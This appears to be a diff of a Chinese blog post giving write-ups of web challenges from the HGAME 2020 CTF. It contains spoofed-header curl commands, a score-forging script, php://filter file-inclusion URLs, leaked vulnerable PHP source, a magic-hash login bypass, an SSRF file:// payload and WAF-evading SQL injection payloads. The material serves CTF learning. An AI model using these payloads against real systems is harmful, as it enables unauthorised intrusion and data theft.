@@ -6,15 +6,32 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://yd0ng.github.io">
-  <title>Archives: 2020 | Blog</title>
+  <title>HGAME 2020 | Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Blog">
-<meta property="og:url" content="https://yd0ng.github.io/archives/2020/page/2/index.html">
+  <meta name="description" content="记录一下HGAME2020的Web的部分Web题解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGAME 2020">
+<meta property="og:url" content="https://yd0ng.github.io/2020/02/13/HGAME-2020/index.html">
 <meta property="og:site_name" content="Blog">
+<meta property="og:description" content="记录一下HGAME2020的Web的部分Web题解">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/13/HGAME-2020/1.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/13/HGAME-2020/2.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/13/HGAME-2020/3.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/13/HGAME-2020/4.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/13/HGAME-2020/5.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/13/HGAME-2020/6.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/13/HGAME-2020/7.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/13/HGAME-2020/8.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/13/HGAME-2020/9.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/13/HGAME-2020/10.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/13/HGAME-2020/11.png">
+<meta property="article:published_time" content="2020-02-13T06:27:52.000Z">
+<meta property="article:modified_time" content="2020-02-13T13:53:41.334Z">
 <meta property="article:author" content="yd0ng">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yd0ng.github.io/2020/02/13/HGAME-2020/1.png">
   
   
     <link rel="icon" href="/themes/yilia/source/">
@@ -130,406 +147,309 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-HGAME-2020" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      HGAME 2020
+    </h1>
+  
+
+        
+        <a href="/2020/02/13/HGAME-2020/" class="archive-article-date">
+  	<time datetime="2020-02-13T06:27:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-13</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>记录一下HGAME2020的Web的部分Web题解</p>
+<a id="more"></a>
+
+<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Cosmos的博客"><a href="#Cosmos的博客" class="headerlink" title="Cosmos的博客"></a>Cosmos的博客</h2><p>提示使用了版本管理系统，猜测存在git源码泄露，</p>
+<p><img src="/2020/02/13/HGAME-2020/1.png" alt></p>
+<p>发现确实是，使用Githack下载.git文件夹或者直接查看配置文件</p>
+<p><img src="/2020/02/13/HGAME-2020/2.png" alt></p>
+<p>发现一个新的GitHub地址，访问，查看commit</p>
+<p><img src="/2020/02/13/HGAME-2020/3.png" alt></p>
+<p>发现有一个commit的评论有点多，点开发现一串base64,解码得到flag</p>
+<h2 id="接头霸王"><a href="#接头霸王" class="headerlink" title="接头霸王"></a>接头霸王</h2><p>根据提示，猜测是http请求头伪造，于是开始伪造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --referer https:&#x2F;&#x2F;vidar.club&#x2F; http:&#x2F;&#x2F;kyaru.hgame.n3ko.co</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/13/HGAME-2020/4.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --referer https:&#x2F;&#x2F;vidar.club&#x2F; -H &#39;X-Forwarded-For: 127.0.0.1&#39; http:&#x2F;&#x2F;kyaru.hgame.n3ko.co</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/13/HGAME-2020/5.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url --referer https:&#x2F;&#x2F;vidar.club&#x2F; -H &#39;X-Forwarded-For: 127.0.0.1&#39;  --user-agent Cosmos Brower http:&#x2F;&#x2F;kyaru.hgame.n3ko.co</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/13/HGAME-2020/6.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vs -X POST --referer https:&#x2F;&#x2F;vidar.club&#x2F; -H &#39;X-Forwarded-For: 127.0.0.1&#39;  --user-agent Cosmos Brower http:&#x2F;&#x2F;kyaru.hgame.n3ko.co</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/13/HGAME-2020/7.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --referer https:&#x2F;&#x2F;vidar.club&#x2F; -H &#39;X-Forwarded-For: 127.0.0.1&#39; -H &#39;If-Unmodified-Since: Fri, 01 Jan 2077 00:00:00 GMT&#39; --user-agent Cosmos Brower http:&#x2F;&#x2F;kyaru.hgame.n3ko.co -vs -X POST</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/13/HGAME-2020/8.png" alt></p>
+<h2 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h2><p>访问首页直接跳到new.php,访问index.php，回显405(不合法的请求方式)，将GET请求更改为POST请求，得到关键提示<br><img src="/2020/02/13/HGAME-2020/9.png" alt></p>
+<p>然后这个很明显是?a=两个数相加，但是怎么都不对<br>后来发现burp的+号要转码，将+进行一下url编码就得到了flag，确实是细节</p>
+<h2 id="🐔尼泰玫"><a href="#🐔尼泰玫" class="headerlink" title="🐔尼泰玫"></a>🐔尼泰玫</h2><p>蔡徐坤打篮球？？？在游戏死亡的时候发送一个数据包<br><img src="/2020/02/13/HGAME-2020/10.png" alt><br>|前面是分数，后面是时间戳的md5，于是写出解题脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import hashlib</span><br><span class="line">def md5vale(key):</span><br><span class="line">    print(key)</span><br><span class="line">    input_name &#x3D; hashlib.md5()</span><br><span class="line">    input_name.update(key.encode(&quot;utf-8&quot;))</span><br><span class="line">    print(input_name.hexdigest())</span><br><span class="line">    return input_name.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess&#x3D;requests.Session()</span><br><span class="line">data&#x3D;&#123;</span><br><span class="line">    &quot;score&quot;:&quot;30001|&quot;+str(md5vale(str(int(time.time()))))</span><br><span class="line">&#125;</span><br><span class="line">print(data)</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;cxk.hgame.wz22.cc&#x2F;submit&quot;</span><br><span class="line">result&#x3D;sess.post(url,data).text</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+<p>后来官方wp说这个题直接改js就行。。。</p>
+<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h2><p>明显的文件包含，读源码</p>
+<p><a href="http://cosmos-admin.hgame.day-day.work/index.php?action=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://cosmos-admin.hgame.day-day.work/index.php?action=php://filter/read=convert.base64-encode/resource=index.php</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: admin.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$action &#x3D; @$_GET[&#39;action&#39;];</span><br><span class="line">$filter &#x3D; &quot;&#x2F;config|etc|flag&#x2F;i&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;action&#39;]) &amp;&amp; !empty($_GET[&#39;action&#39;])) &#123;</span><br><span class="line">    if(preg_match($filter, $_GET[&#39;action&#39;])) &#123;</span><br><span class="line">        echo &quot;Hacker get out!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">        include $action;</span><br><span class="line">&#125;</span><br><span class="line">elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: ?action&#x3D;login.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://cosmos-admin.hgame.day-day.work/index.php?action=php://filter/read=convert.base64-encode/resource=admin.php" target="_blank" rel="noopener">http://cosmos-admin.hgame.day-day.work/index.php?action=php://filter/read=convert.base64-encode/resource=admin.php</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">    header(&#39;Location: index.php&#39;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function insert_img() &#123;</span><br><span class="line">    if (isset($_POST[&#39;img_url&#39;])) &#123;</span><br><span class="line">        $img_url &#x3D; @$_POST[&#39;img_url&#39;];</span><br><span class="line">        $url_array &#x3D; parse_url($img_url);</span><br><span class="line">        if (@$url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;timgsa.baidu.com&quot;) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c &#x3D; curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $res &#x3D; curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar &#x3D; base64_encode($res);</span><br><span class="line"></span><br><span class="line">        if(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            return $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        return base64_encode(file_get_contents(&quot;static&#x2F;logo.png&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Cosmos&#39;Blog - åå°ç®¡ç&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;a href&#x3D;&quot;logout.php&quot;&gt;éåºç»é&lt;&#x2F;a&gt;</span><br><span class="line">        &lt;div style&#x3D;&quot;text-align: center;&quot;&gt;</span><br><span class="line">            &lt;h1&gt;Welcome &lt;?php echo $_SESSION[&#39;username&#39;];?&gt; &lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">            &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">                &lt;legend&gt;æå¥å¾ç&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;p&gt;&lt;label&gt;å¾çurl: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;img_url&quot; placeholder&#x3D;&quot;&quot;&gt;&lt;&#x2F;label&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                &lt;p&gt;&lt;button type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot;&gt;æå¥&lt;&#x2F;button&gt;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">                &lt;legend&gt;è¯è®ºç®¡ç&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;h2&gt;å¾å¼å..&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;&quot;&gt;</span><br><span class="line">                &lt;legend&gt;æç« åè¡¨&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;h2&gt;å¾å¼å..&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;height: 50%&quot;&gt;</span><br><span class="line">            &lt;div style&#x3D;&quot;text-align: center;&quot;&gt;</span><br><span class="line">                &lt;img height&#x3D;&#39;200&#39; width&#x3D;&#39;500&#39; src&#x3D;&#39;data:image&#x2F;jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static&#x2F;error.jpg&quot;)); ?&gt;&#39;&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://cosmos-admin.hgame.day-day.work/index.php?action=php://filter/read=convert.base64-encode/resource=login.php" target="_blank" rel="noopener">http://cosmos-admin.hgame.day-day.work/index.php?action=php://filter/read=convert.base64-encode/resource=login.php</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Only for debug</span><br><span class="line">if (DEBUG_MODE)&#123;</span><br><span class="line">    if(isset($_GET[&#39;debug&#39;])) &#123;</span><br><span class="line">        $debug &#x3D; $_GET[&#39;debug&#39;];</span><br><span class="line">        if (!preg_match(&quot;&#x2F;^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$&#x2F;&quot;, $debug)) &#123;</span><br><span class="line">            die(&quot;args error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&quot;var_dump($$debug);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: admin.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">        if ($admin_password &#x3D;&#x3D; md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] &#x3D;&#x3D;&#x3D; $admin_username)&#123;</span><br><span class="line">            $_SESSION[&#39;username&#39;] &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">            header(&quot;Location: admin.php&quot;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;ç¨æ·åæå¯ç éè¯¯&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;author&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">    &lt;title&gt;Cosmosçåå®¢åå°&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;signin.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;sticky-footer.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;form class&#x3D;&quot;form-signin&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;login.php&quot;&gt;</span><br><span class="line">        &lt;h2 class&#x3D;&quot;form-signin-heading&quot;&gt;åå°ç»é&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;ç¨æ·å&quot; required autofocus&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;å¯ç &quot; required&gt;</span><br><span class="line">        &lt;input class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;footer class&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">	&lt;center&gt;</span><br><span class="line">	&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;p class&#x3D;&quot;text-muted&quot;&gt;Created by Annevi&lt;&#x2F;p&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;footer&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>简单代码审计，先通过login.php读取全局变量</p>
+<p><a href="http://cosmos-admin.hgame.day-day.work/login.php?debug=GLOBALS" target="_blank" rel="noopener">http://cosmos-admin.hgame.day-day.work/login.php?debug=GLOBALS</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(9) &#123; [&quot;_GET&quot;]&#x3D;&gt; array(1) &#123; [&quot;debug&quot;]&#x3D;&gt; string(7) &quot;GLOBALS&quot; &#125; [&quot;_POST&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]&#x3D;&gt; array(1) &#123; [&quot;PHPSESSID&quot;]&#x3D;&gt; string(26) &quot;i3tnfac7utddib1ln6otips5gu&quot; &#125; [&quot;_FILES&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;debug&quot;]&#x3D;&gt; string(7) &quot;GLOBALS&quot; [&quot;admin_password&quot;]&#x3D;&gt; string(32) &quot;0e114902927253523756713132279690&quot; [&quot;admin_username&quot;]&#x3D;&gt; string(7) &quot;Cosmos!&quot; [&quot;_SESSION&quot;]&#x3D;&gt; &amp;array(0) &#123; &#125; [&quot;GLOBALS&quot;]&#x3D;&gt; array(9) &#123; [&quot;_GET&quot;]&#x3D;&gt; array(1) &#123; [&quot;debug&quot;]&#x3D;&gt; string(7) &quot;GLOBALS&quot; &#125; [&quot;_POST&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]&#x3D;&gt; array(1) &#123; [&quot;PHPSESSID&quot;]&#x3D;&gt; string(26) &quot;i3tnfac7utddib1ln6otips5gu&quot; &#125; [&quot;_FILES&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;debug&quot;]&#x3D;&gt; string(7) &quot;GLOBALS&quot; [&quot;admin_password&quot;]&#x3D;&gt; string(32) &quot;0e114902927253523756713132279690&quot; [&quot;admin_username&quot;]&#x3D;&gt; string(7) &quot;Cosmos!&quot; [&quot;_SESSION&quot;]&#x3D;&gt; &amp;array(0) &#123; &#125; [&quot;GLOBALS&quot;]&#x3D;&gt; *RECURSION* &#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造POST登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;Cosmos!&amp;password&#x3D;QNKCDZO</span><br></pre></td></tr></table></figure>
+<p>登陆成功，跳转到admin.php，审计代码，发现和上海市18年的比赛web1差不多ssrf，构造poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;localhost&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
+<p>成功请求得到flag</p>
+<h2 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h2><p>看到?id=1，猜测应该是sql注入，尝试注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 正常回显</span><br><span class="line">id&#x3D;1&#39; 无回显</span><br><span class="line">id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1 回显1&#39;and&#39;1&#39;&#x3D;&#39;1,空格没了</span><br><span class="line">id&#x3D;1&#39;&#x2F;**&#x2F;and&#x2F;**&#x2F;&#39;1&#39;&#x3D;&#39;1 正常回显</span><br><span class="line">id&#x3D;1&#39;&#x2F;**&#x2F;and&#x2F;**&#x2F;&#39;1&#39;&#x3D;&#39;2 无回显了,基本确定是单引号字符型注入了，开始注入</span><br></pre></td></tr></table></figure>
+<p>判断字段数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39;&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;1%23 正常回显</span><br><span class="line">id&#x3D;1&#39;&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;2%23 无回显，字段数应该是1</span><br></pre></td></tr></table></figure>
+<p>判断显示位</p>
+<p>发现输入union的时候啥也没了，猜测存在waf,至少waf掉了union和select,但是大小写可以过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0&#39;&#x2F;**&#x2F;Union&#x2F;**&#x2F;Select&#x2F;**&#x2F;1%23 回显1</span><br></pre></td></tr></table></figure>
+
+<p>查询数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0&#39;&#x2F;**&#x2F;Union&#x2F;**&#x2F;Select&#x2F;**&#x2F;database()%23</span><br></pre></td></tr></table></figure>
+
+<p>查询表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0&#39;&#x2F;**&#x2F;Union&#x2F;**&#x2F;Select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;From&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
+<p>查询字段名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0&#39;&#x2F;**&#x2F;Union&#x2F;**&#x2F;Select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;From&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;f1aggggggggggggg&#39;%23</span><br></pre></td></tr></table></figure>
+<p>查询数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0&#39;&#x2F;**&#x2F;Union&#x2F;**&#x2F;Select&#x2F;**&#x2F;fl4444444g&#x2F;**&#x2F;From&#x2F;**&#x2F;f1aggggggggggggg%23</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
